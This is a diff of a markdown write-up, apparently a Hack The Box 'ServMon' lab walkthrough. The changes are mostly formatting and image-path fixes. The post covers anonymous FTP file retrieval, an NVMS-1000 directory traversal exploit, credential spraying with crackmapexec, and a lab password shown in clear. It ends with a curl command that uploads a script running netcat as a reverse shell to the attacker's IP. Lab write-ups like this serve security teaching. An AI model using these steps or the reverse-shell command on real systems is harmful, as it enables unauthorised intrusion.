@@ -50,14 +50,16 @@ You can see we have anonymous access to login. We know that the box is a windows
 Using ls or DIR here would display that there are two users; Nathan and Nadine. we can repeat the above steps to change into their directories;
 
 **Nadine**
-ls in Nadines directory shows the file 'Confidential.txt' using the 'get' command we can download this file to our machine to see it's contents
+
+Running ls in Nadines directory shows the file 'Confidential.txt' using the 'get' command we can download this file to our machine to see it's contents
 
 ![catNadine](/assets/images/servmon/servmoncatnadine.png)
 
 This gives us a clue that there may be a file of interest on Nathan's desktop. Keep this in mind for later.
 
 **Nathan**
-ls in Nathans directory also returns a file 'Notes to do.txt', the same process of using the 'get' command and viewing it's contents.
+
+Running ls in Nathans directory also returns a file 'Notes to do.txt', the same process of using the 'get' command and viewing it's contents.
 
 ![catnathan](/assets/images/servmon/servmoncatnathan.png)
 
@@ -68,7 +70,7 @@ There doesn't appear to be much more we can do with the FTP service for now, but
 
 As this is the standard HTTP port opening up a browser and navigating to: http://10.10.10.184 provides us with the following page:
 
-![defaulthttp](assets/images/servmon/servmonhttpdefault.png)
+![defaulthttp](/assets/images/servmon/servmonhttpdefault.png)
 
 As always with a login box it's a good idea to try some default credentials: admin:admin, admin:password etc. In this case nothing worked for us here, and googling for 'NVMS-1000 default credentials' turned up empty. Changing our search to just 'NVMS-1000' pointed us towards [this exploit](https://www.exploit-db.com/exploits/47774) from exploitdb. The exploit seems to be related to directory traversal and simply intercepting the traffic using burp suite, editing the path and sending it on.
 
@@ -107,11 +109,12 @@ With crackmapexec installed the syntax is pretty straightforward
 
     crackmapexec <service(smb/ssh)> <TargetIP> -u <Username OR Usernamefile> -p <password OR passwordfile>
 
-![crackmap](/assets/images/servmon/sermoncrackmap.png)
+![crackmap](/assets/images/servmon/servmoncrackmap.png)
 
 Ah... perfection, we have some valid credentials across both SSH and SMB. 
 
 **Username: Nadine**
+
 **Password: L1k3B1gBut7s@W0rk**
 
 Er.. Sure, each to their own.
@@ -125,6 +128,7 @@ We can try these details to login via SSH and if successful we should be able to
 
 Now time for the fun part, taking our low level user and gaining root.
 
+
 ## Enumeration, Post-Compromise
 
 That's it folks. Rinse. Repeat. Once we get access we treat the system as if we were an external user again and see what we are working with, the benefit we have is we have access to have a poke around the file system and installed programs. This is where I start, making sure that there is nothing glaringly obvious right off the bat.
@@ -134,6 +138,7 @@ Taking a look around the users directories there isn't anything too interesting 
 In our case we have results on both accounts:
 
 [https://docs.nsclient.org/](https://docs.nsclient.org/)
+
 [https://www.exploit-db.com/exploits/46802](https://www.exploit-db.com/exploits/46802)
 
 The exploit is a 7 step process which involves grabbing an admin password from a config file, setting up a malicious script and executing it.
@@ -181,6 +186,7 @@ I spent far too long trying to get the WebUI to behave itself I got so fed up I 
 In the documentation aptly under [https://docs.nsclient.org/api/rest/scripts](https://docs.nsclient.org/api/rest/scripts) there is a section about using curl to upload external scripts to the program, it literally gives you the command. Amazing. Well, we have to add our script to the --data-binary command but I'll take what we're given.
 
 Anyhow:
+
     curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary "C:\Temp\nc.exe 10.10.15.248 5555 -e cmd.exe"
 
 Again, the IP address of "10.10.15.248" and the port "5555" will need to be changed to match your machines IP and the port of your choice.
